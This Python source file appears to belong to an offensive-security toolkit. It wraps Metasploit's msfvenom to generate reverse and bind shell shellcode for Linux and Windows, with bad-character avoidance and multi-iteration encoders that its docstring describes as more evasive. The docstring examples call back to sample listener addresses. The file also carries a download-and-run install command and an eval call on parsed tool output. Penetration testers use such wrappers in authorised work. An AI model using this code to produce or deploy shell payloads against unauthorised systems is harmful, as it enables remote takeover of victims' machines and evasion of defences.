"""Msfvenom wrapper for shellcode generation."""

import logging
import shutil
import subprocess
from typing import Optional

from ofx.settings import settings

logger = logging.getLogger(settings.app_branding)


class MsfvenomGenerator:
    """Metasploit Framework msfvenom CLI wrapper for shellcode generation.

    Provides a Python interface to msfvenom for generating professional-grade
    shellcode with encoding, bad character avoidance, and multiple output formats.

    Attributes:
        msfvenom_path: Absolute path to msfvenom executable

    Example:
        >>> generator = MsfvenomGenerator()
        >>> shellcode = generator.generate(
        ...     os_target='linux',
        ...     arch='x64',
        ...     shell_type='reverse',
        ...     ip='192.168.1.100',
        ...     port=4444,
        ...     bad_chars=['\\x00', '\\x0a'],
        ...     encoder='x64/xor_dynamic'
        ... )
        >>> len(shellcode)
        103
    """

    def __init__(self):
        """Initialize msfvenom wrapper.

        Raises:
            RuntimeError: If msfvenom not found in PATH
        """
        self.msfvenom_path = shutil.which("msfvenom")
        if not self.msfvenom_path:
            raise RuntimeError(
                "msfvenom not found in PATH. Install Metasploit Framework:\n"
                "  Ubuntu/Debian: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall\n"
                "  macOS: brew install metasploit\n"
                "  Or use Docker assembly compilation instead (use_docker_compile=True)"
            )

    def _get_payload_name(self, os_target: str, arch: str, shell_type: str) -> str:
        """Translate platform parameters to msfvenom payload name.

        Args:
            os_target: Operating system ('linux', 'windows')
            arch: Architecture ('x86', 'x64')
            shell_type: Shell type ('reverse', 'bind')

        Returns:
            Msfvenom payload name (e.g., 'linux/x64/shell_reverse_tcp')

        Raises:
            ValueError: If combination not supported
        """
        payload_map = {
            ("linux", "x86", "reverse"): "linux/x86/shell_reverse_tcp",
            ("linux", "x86", "bind"): "linux/x86/shell_bind_tcp",
            ("linux", "x64", "reverse"): "linux/x64/shell_reverse_tcp",
            ("linux", "x64", "bind"): "linux/x64/shell_bind_tcp",
            ("windows", "x86", "reverse"): "windows/shell_reverse_tcp",
            ("windows", "x86", "bind"): "windows/shell_bind_tcp",
            ("windows", "x64", "reverse"): "windows/x64/shell_reverse_tcp",
            ("windows", "x64", "bind"): "windows/x64/shell_bind_tcp",
        }
        key = (os_target.lower(), arch.lower(), shell_type.lower())
        if key not in payload_map:
            raise ValueError(f"Unsupported payload: {key}")
        return payload_map[key]

    def generate(
        self,
        os_target: str,
        arch: str,
        shell_type: str,
        ip: str,
        port: int,
        bad_chars: Optional[list[str]] = None,
        encoder: Optional[str] = None,
        iterations: int = 1,
        format: str = "raw",
    ) -> bytes:
        """Generate shellcode using msfvenom with encoding options.

        Generates shellcode using Metasploit's msfvenom tool with support for
        bad character avoidance, custom encoders, and multiple output formats.

        Args:
            os_target: Target OS ('linux', 'windows')
            arch: Architecture ('x86', 'x64')
            shell_type: Shell type ('reverse', 'bind')
            ip: IP address for reverse shell
            port: Port number for connection
            bad_chars: Characters to avoid (e.g., ['\\x00', '\\x0a', '\\x0d'])
            encoder: Encoder module name (e.g., 'x86/shikata_ga_nai', 'x64/xor_dynamic')
            iterations: Encoding iterations for polymorphism (higher = larger but more evasive)
            format: Output format ('raw', 'python', 'c', 'hex', 'base64')

        Returns:
            Raw shellcode bytes

        Raises:
            RuntimeError: If msfvenom execution fails or times out

        Example:
            >>> gen = MsfvenomGenerator()
            >>> sc = gen.generate(
            ...     'windows', 'x86', 'reverse', '10.0.0.1', 443,
            ...     bad_chars=['\\x00', '\\x0a'],
            ...     encoder='x86/shikata_ga_nai',
            ...     iterations=3
            ... )
            >>> '\\x00' in sc
            False
        """
        payload_name = self._get_payload_name(os_target, arch, shell_type)

        cmd = [self.msfvenom_path, "-p", payload_name]

        if shell_type == "reverse":
            cmd.extend(["LHOST=" + ip, f"LPORT={port}"])
        elif shell_type == "bind":
            cmd.extend([f"LPORT={port}"])

        if bad_chars:
            bad_char_str = "".join(bad_chars)
            cmd.extend(["-b", bad_char_str])

        if encoder:
            cmd.extend(["-e", encoder, "-i", str(iterations)])

        cmd.extend(["-f", format])

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                check=True,
                timeout=30,
            )
            shellcode = result.stdout

            if format == "python":
                shellcode = self._parse_python_format(shellcode.decode())
            elif format == "c":
                shellcode = self._parse_c_format(shellcode.decode())

            logger.info(
                f"Generated {len(shellcode)} bytes using msfvenom: {payload_name}"
            )
            return shellcode

        except subprocess.CalledProcessError as e:
            error_msg = e.stderr.decode() if e.stderr else str(e)
            raise RuntimeError(f"Msfvenom failed: {error_msg}")
        except subprocess.TimeoutExpired:
            raise RuntimeError("Msfvenom timed out after 30 seconds")

    def _parse_python_format(self, output: str) -> bytes:
        """Parse msfvenom python format output."""
        for line in output.split("\n"):
            if "buf" in line and "=" in line:
                start = line.find('b"')
                if start == -1:
                    start = line.find("b'")
                if start != -1:
                    byte_str = line[start:]
                    byte_str = byte_str.rstrip().rstrip('"').rstrip("'")
                    return eval(byte_str)
        raise ValueError("Could not parse msfvenom python output")

    def _parse_c_format(self, output: str) -> bytes:
        """Parse msfvenom C format output."""
        hex_str = ""
        for line in output.split("\n"):
            if "\\x" in line:
                hex_str += line.strip().strip('"').strip(";")

        if not hex_str:
            raise ValueError("Could not parse msfvenom C output")

        hex_values = hex_str.split("\\x")[1:]
        return bytes([int(h[:2], 16) for h in hex_values if h])

    def list_payloads(
        self, os_target: Optional[str] = None, arch: Optional[str] = None
    ) -> list[str]:
        """List all available msfvenom payloads with optional filtering.

        Queries msfvenom for its complete payload library, with optional
        filtering by operating system and architecture.

        Args:
            os_target: Filter by OS ('linux', 'windows', 'osx', 'android', etc.)
            arch: Filter by architecture ('x86', 'x64', 'mips', 'arm', etc.)

        Returns:
            List of payload names matching filters

        Example:
            >>> gen = MsfvenomGenerator()
            >>> payloads = gen.list_payloads(os_target='linux', arch='x64')
            >>> 'linux/x64/shell_reverse_tcp' in payloads
            True
        """
        cmd = [self.msfvenom_path, "-l", "payloads"]
        result = subprocess.run(cmd, capture_output=True, text=True)

        payloads = []
        for line in result.stdout.split("\n"):
            line = line.strip()
            if not line or line.startswith("Name") or line.startswith("="):
                continue

            parts = line.split()
            if parts:
                payload = parts[0]

                if os_target and not payload.startswith(os_target.lower()):
                    continue
                if arch and arch.lower() not in payload:
                    continue

                payloads.append(payload)

        return payloads


_msfvenom_generator: Optional[MsfvenomGenerator] = None


def get_msfvenom_generator() -> MsfvenomGenerator:
    """Get or create msfvenom generator singleton."""
    global _msfvenom_generator
    if _msfvenom_generator is None:
        _msfvenom_generator = MsfvenomGenerator()
    return _msfvenom_generator
